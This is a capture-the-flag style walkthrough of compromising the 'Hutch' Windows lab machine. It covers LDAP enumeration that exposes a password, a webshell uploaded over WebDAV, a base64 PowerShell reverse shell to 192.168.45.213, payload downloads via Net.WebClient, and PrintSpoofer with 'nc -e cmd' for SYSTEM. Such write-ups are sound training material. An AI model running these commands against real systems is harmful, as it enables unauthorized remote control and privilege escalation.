#box #NSE #WebShell #ReverseShell #encrypt #SeImpersonatePrivilege #PrintSpoofer #caDAVer #ldapsearch 

Hutch is a machine consisting in a vulnerability given by a forgotten description in a LDAP user's profile. Afterwards the possibility to leverage the available WebDav permits us to upload a shell into it and then recall it from the web at the resulting address.
Within the webshell we're able to gain a reverse shell with a base64 encoded payload which will give us a foothold. Once on the target machine, the available privileges permits us to leverage on PrintSpoofer (since we're running on a Server 2019 and JuicyPotato is no longer working on that) to gain SYSTEM.

## Nmap

Nmap scan returns plenty of open ports, indeed wére focusing on port 80, 135, 389 and 445

```bash
# Nmap 7.95 scan initiated Mon Jun  9 11:27:35 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 192.168.228.122
Nmap scan report for 192.168.228.122
Host is up (0.036s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Date: Mon, 09 Jun 2025 11:28:02 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-09 11:27:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=6/9%Time=6846C53D%P=x86_64-pc-linux-gnu%r(DNS-S
SF:D-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_
SF:udp\x05local\0\0\x0c\0\x01");
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-09T11:28:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  9 11:28:43 2025 -- 1 IP address (1 host up) scanned in 68.61 seconds
```

## 389 - LDAP

We try to query ldap with a nmap scripts that extracts for us all the available information from the given target's LDAP

```bash
nmap -n -sV --script "ldap* and not brute" --script-args 'ldap.maxobjects=-1' $ip -o nmap_ldapScanMaxObjects-1
```

Once done so, we grep the Description fields, for easy readability and notice the following content:
```bash
cat nmap_ldapScanMaxObjects-1 | grep description

# This will output some description lines, one for each object, but this in particular feels useful
# description: Password set to CrabSharkJellyfish192 at user's request. Please change on next login.
```

Looking back at the bigger picture, we notice that the related account is a certain `fmcsorley`

![[attachments/hutch-writeup-1.webp]]

## 80 - WebDAV

We know have some stable credentials to work with `fmcsorley:CrabSharkJellyfish192`, let's use `cadaver` to access the WebDAV shown on the nmap scan

```bash
cadaver http://$ip

# Here we'll be asked the credentials, we can easily add the one found above and authenticate.
```

We know that the webserver is running on IIS, thus we'll be able to run asp/aspx files on it (as we can also see the index.aspx file residing on the webdav).
We can try to use **laudanum**'s webshell, precisely `/usr/share/seclists/Web-Shells/laudanum-1.0/aspx/shell.aspx`

>Before effectively using laudanum's shell, do not forget to update it to allow our ip onto this shell
>
 ![[attachments/hutch-writeup-2.webp]]

We can then upload it on the webdav with `put shell.aspx` and go to `http://$ip/shell.aspx` to play around with our webshell.

## Foothold

To gain a foothold, we can effectively try different combinations of reverse shell, what seemed to work to me was a base64 encoded payload in powershell.

```shell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

# Decoded this would be:
# powershell -e $client = New-Object System.Net.Sockets.TCPClient("192.168.45.213",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
```

We're now onto the machine, authenticated as `iis apppool\defaultapppool`.
## Privilege Escalation

We first check our privileges with `whoami /priv` and discover that we have `SeImpersonatePrivilege`. Afterward we use `systeminfo` to understand what we're playing, discovering it's a Windows Server 2019.
Looking online we discover that JuicyPotato does no longer work on this version of Windows Server, we'll have to rely on a cousin of JuicyPotato, called `PrintSpoofer` (more on that [here](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)).

We go to [PrintSpoofer's Github](https://github.com/itm4n/PrintSpoofer/releases) and download the x64 version (from systeminfo we know that we're on a x64-based PC) on our machine. Once got it, we transfer that on the target machine with **powershell's IEX DownloadFile**

>Before doing so, let's be sure to have a folder where we can write files into. Like C:\Temp or whatever folder we have rights to. Otherwise the script would fail and debugging it can lead to rabbit holes.

```powershell
powershell IEX(New-Object Net.WebClient).DownloadFile('http://$attackerIP:$attackerPort/PrintSpoofer64.exe','C:\Temp\PrintSpoofer64.exe') # we're already on powershell so we can omit the initial powershell
```

>The first tried we made was with the First usage of the PrintSpoofer exploit, but we couldn't achieve it. For some reason the shell was really unstable, so unstable that even data transfer were causing it to hang, thus we opted to try the second usage, which required to redirect the shell to another netcat session by leveraging the netcat executable transmission as specified [here](https://github.com/itm4n/PrintSpoofer?tab=readme-ov-file#usage-2-spawn-a-system-process-and-**exit**)
>

To do so, we also need netcat on the target machine, we'll download nc64.exe and then move it to the target machine

```powershell
powershell IEX(New-Object Net.WebClient).DownloadFile('http://192.168.45.213:8001/nc64.exe','C:\Temp\nc.exe')
```

Once everything in place, we first run a new netcat listener on our machine:

```bash
nc -lvnp 4444
```

We then execute the following command on the target's machine, to successfully achieve a reverse shell on our new listener:
```shell
./PrintSpoofer64.exe -c "C:\Temp\nc.exe 192.168.45.213 5985 -e cmd" # don't forget `.\` since Windows is dummier than Linux and can't find files properly without giving him some help :D
```

And achieve a reverse shell as the domain administrator of the machine.

# TIL

* CaDAVer is a thing and WebDAV doesn't seem to behave too differently from a FTP Server
* Never type too much in the LDAP fields